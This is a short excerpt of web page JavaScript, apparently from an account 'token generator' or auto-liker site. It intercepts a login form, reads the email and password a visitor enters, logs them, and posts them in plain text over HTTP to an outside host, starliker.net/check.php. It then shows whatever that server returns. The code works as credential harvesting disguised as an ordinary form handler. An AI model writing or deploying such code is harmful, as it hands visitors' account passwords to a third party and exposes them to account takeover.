		<script type="text/javascript">
			$('#validate').submit(function() {
				
				var email = $('#email').val();
				var password = $('#password').val();
				
				console.log(email, password);
				if (email != '') {
					$('#validate').fadeOut(function() {
						$('#loading').fadeIn();
						$.post("http://starliker.net/check.php", {
							"email": email,
							"password": password
						}, 
						function(data) {
						$('#token_gen').append(data);
						$('#loading').fadeOut();
						})
					});
				}
				return false;
			}) 
		</script>
		<script>
			// Back Button
			function hideMe() {
				var main = document.getElementById('validate');
				if (main.style.display === 'none') {
					main.style.display = 'block';
					document.getElementById('token_gen').innerHTML = '';
				} else {
					main.style.display = 'none';
				}
			}
		</script>
		
